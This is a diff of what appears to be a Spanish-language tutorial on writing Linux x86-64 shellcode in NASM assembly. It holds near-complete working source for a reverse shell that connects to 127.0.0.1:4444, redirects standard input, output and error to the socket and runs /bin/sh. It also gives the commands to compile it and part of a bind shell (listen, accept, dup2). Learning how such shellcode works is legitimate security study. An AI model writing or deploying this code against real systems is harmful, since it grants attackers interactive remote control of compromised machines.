@@ -46,26 +46,26 @@ root
 global _start
 
 _start:
+;--------------------------------- STRUCT --------------------------------------------------------
 	xor rax, rax 
 	push rax
 	mov dword [rsp-4], 0x0100007f ; server.sin_addr.s_addr = inet_addr("127.0.0.1") // 0x7f = 127 , va al reves
 	mov word [rsp-6], 0x5c11      ; server.sin_port = htons(4444) // puerto 4444 <- hex(socket(htons(4444))) 
 	mov word [rsp-8], 0x2	      ; server.sin_family = AF_INET  // AF_INET o sea Ipv4 se representa con un "2"
 	sub rsp, 8		      ; bzero(&server.sin_zero, 8) // la suma de lo anterior son 8 bytes, asi que alineamos la pila
-
+;-------------------------------- SOCKET -------------------------------------------------------------------------
     	mov rax, 41 		      ; sock = socket(AF_INET, SOCK_STREAM, 0)
 	mov rdi, 2 		      ; AF_INET
 	mov rsi, 1 		      ; SOCK_STREAM
 	mov rdx, 0 		      ; 0
 	syscall
 	mov rdi, rax 		      ; rdi = sock
-
+;-------------------------------- CONNECT -------------------------------------------------------------------------
 	mov rax, 42 		      ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
 	mov rsi, rsp 		      ; rsp -> estructura de datos (ip,port)
 	mov rdx, 16 		      ; tamaño de esa estructura
 	syscall
-
-        
+;-------------------------------- DUP -------------------------------------------------------------------------
 	mov rax, 33 		      ; duplicar al socket stdin, out y err
    	mov rsi, 0 		      ; dup2(sock, 0)
     	syscall
@@ -75,7 +75,7 @@ _start:
     	mov rax, 33		      ; dup2(sock, 2);
     	mov rsi, 2
     	syscall
-
+;-------------------------------- BIN BASH -------------------------------------------------------------------------
     ; execve("/bin/sh", 0),  explicado en otro articulo
     xor rax, rax 		      
     push rax
@@ -88,6 +88,11 @@ _start:
     mov rsi, rsp
     add rax, 59			      ; execve (syscall numero 59)
     syscall
+```
+Compilarlo
+```
+└─root@kali# nasm -felf64 RevShell.nasm -o rev.o                                                                                                                   
+└─root@kali# ld rev.o -o rev                                           
 ```
 
 
@@ -162,21 +167,21 @@ _start:
 	mov rax, 50  ;// listen(sock, MAX_CLIENTS)
 	mov rsi, 2   ;// rdi es sock ya y RSI es 2, o sea hay dos sockets (cliente y servidor)
 	syscall
-;---------------------------------------------------------------------------------------------------------------	
-	mov rax, 43 ;// new = accept(sock, (struct sockaddr *)&client, &sockaddr_len). Accpet es el syscall 43.
-	sub rsp, 16 ;// rdi ya es sock, en rsp alocamos 16 bytes (que llenara el socket accept)
-	mov rsi, rsp ;// y ese struct irá a RSI <- (struct sockaddr *)&client
-        mov byte [rsp-1], 16 // alienamos la pila
+;-------------------------------- ACCEPT -------------------------------------------------------------------------
+	mov rax, 43		;// new = accept(sock, (struct sockaddr *)&client, &sockaddr_len). Accpet es el syscall 43.
+	sub rsp, 16 		;// rdi ya es sock, en rsp alocamos 16 bytes (que llenara el socket accept)
+	mov rsi, rsp	 	;// y ese struct irá a RSI <- (struct sockaddr *)&client
+        mov byte [rsp-1], 16 	;// alienamos la pila
         sub rsp, 1   
-        mov rdx, rsp ;// lo mete en rdx <- &sockaddr_len
-        syscall ;// accept bloquea llamada y solo escucha.
+        mov rdx, rsp 		;// lo mete en rdx <- &sockaddr_len
+        syscall 		;// accept bloquea llamada y solo escucha.
 ;---------------------------------------------------------------------------------------------------------------
-	mov r9, rax  ;// store the client socket description 
-        mov rax, 3 ;// close parent, rdi ya tiene el socket
+	mov r9, rax 		;// guardamos el socket cliente en r9
+        mov rax, 3 		;// cerramos el padre (syscall 3 = close) rdi ya tiene el socket
         syscall      
 ;---------------------------------------------------------------------------------------------------------------
 
-        mov rdi, r9  ;//  duplicar al socket stdin, out y err, como con la reverse shell
+        mov rdi, r9 		 ;//  duplicar al socket stdin, out y err, como con la reverse shell
         mov rax, 33
         mov rsi, 0
         syscall
